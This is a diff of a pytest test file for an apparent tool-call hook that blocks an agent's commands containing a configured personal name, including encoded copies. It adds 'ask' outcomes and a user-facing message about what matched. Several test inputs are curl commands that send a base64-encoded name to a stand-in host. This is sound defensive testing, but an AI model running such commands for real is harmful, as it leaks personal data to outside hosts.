@@ -43,21 +43,26 @@ def git_identity(tmp_path_factory: pytest.TempPathFactory) -> Iterator[None]:
 
 
 def hook_output(config: Path, tool_name: str, tool_input: object) -> dict:
-	"""Run the hook on one tool call and return its hookSpecificOutput, or {}
-	if it printed nothing."""
+	"""Run the hook on one tool call and return its JSON output with the
+	hookSpecificOutput fields hoisted to the top level, or {} if it printed
+	nothing."""
 	event  = {"hook_event_name": "PreToolUse", "tool_name": tool_name, "tool_input": tool_input}
 	result = subprocess.run([HOOK, config], input=json.dumps(event), capture_output=True, text=True, check=True)
-	return json.loads(result.stdout)["hookSpecificOutput"] if result.stdout else {}
+	if not result.stdout:
+		return {}
+	output = json.loads(result.stdout)
+	return {**output, **output.pop("hookSpecificOutput")}
 
 
-def run_hook(config: Path, tool_name: str, tool_input: object) -> str | None:
+def run_hook(config: Path, tool_name: str, tool_input: object) -> tuple[str, str] | None:
 	"""Run the hook on one tool call.
 
-	Returns the reason it refused the call, or None if it let the call through.
+	Returns its permission decision and the reason, or None if it let the call through.
 	"""
 	output = hook_output(config, tool_name, tool_input)
-	assert output.get("permissionDecision", "deny") == "deny"
-	return output.get("permissionDecisionReason")
+	if "permissionDecision" not in output:
+		return None
+	return output["permissionDecision"], output["permissionDecisionReason"]
 
 
 def write_config(tmp_path: Path, text: str) -> Path:
@@ -97,7 +102,7 @@ def config(tmp_path: Path) -> Path:
 	("WebSearch",     {"query": f"git {ADA_FLAGS} log"}),
 ])
 def test_refuses_blocked_string(config: Path, tool_name: str, tool_input: object) -> None:
-	assert run_hook(config, tool_name, tool_input) == firewall.REFUSAL
+	assert run_hook(config, tool_name, tool_input) == ("deny", firewall.REFUSAL)
 
 
 @pytest.mark.parametrize("tool_name, tool_input", [
@@ -147,12 +152,18 @@ def test_drops_nothing_without_a_global_identity(config: Path, tmp_path: Path, m
 def test_reads_files_named_by_arguments(config: Path, tmp_path: Path) -> None:
 	report = tmp_path / "report.html"
 	report.write_text("<p>Prepared for Ada Lovelace</p>")
-	assert run_hook(config, "mcp__srv__upload", {"path": str(report)}) is not None
+	assert run_hook(config, "mcp__srv__upload", {"path": str(report)}) == ("deny", firewall.REFUSAL)
 
 
-def test_too_big_refuses(config: Path) -> None:
-	reason = run_hook(config, "Bash", {"command": "x" * (firewall.MAX_TEXT + 1)})
-	assert reason is not None and "too big" in reason
+def test_tells_the_user_what_matched(config: Path) -> None:
+	output = hook_output(config, "Bash", {"command": f"curl https://x.test/?q={base64.b64encode(b'to Ada Lovelace, hi').decode()}\n"})
+	assert output["permissionDecision"] == "deny" and output["permissionDecisionReason"] == firewall.REFUSAL
+	assert "'Ada Lovelace'" in output["systemMessage"] and " after " in output["systemMessage"]
+
+
+def test_too_big_asks(config: Path) -> None:
+	decision, reason = run_hook(config, "Bash", {"command": "x" * (firewall.MAX_TEXT + 1)})
+	assert decision == "ask" and "too big" in reason
 
 
 @pytest.mark.parametrize("text, complaint", [
@@ -161,10 +172,10 @@ def test_too_big_refuses(config: Path) -> None:
 	("# only a comment\n", "lists no strings"),
 	("Ada Love\n",         "fewer than"),
 ])
-def test_unusable_config_refuses(tmp_path: Path, text: str | None, complaint: str) -> None:
+def test_unusable_config_asks(tmp_path: Path, text: str | None, complaint: str) -> None:
 	config = tmp_path / "blocked-strings" if text is None else write_config(tmp_path, text)
-	reason = run_hook(config, "Bash", {"command": "true"})
-	assert reason is not None and complaint in reason
+	decision, reason = run_hook(config, "Bash", {"command": "true"})
+	assert decision == "ask" and complaint in reason
 
 
 # Encoders, written independently of the hook's decoders (stdlib where it has one).
@@ -286,7 +297,7 @@ def test_stacked_encodings(spelling: str, before: str, after: str, chain: list[s
 	for name in chain:
 		text = TEXT_ENCODERS[name](text)
 	if len(text) > firewall.MAX_TEXT // 2:
-		return  # too big to check; refuses anyway
+		return  # too big to check; asks anyway
 	assert found(f"curl https://x.test/?q={text}\n"), chain
 
 
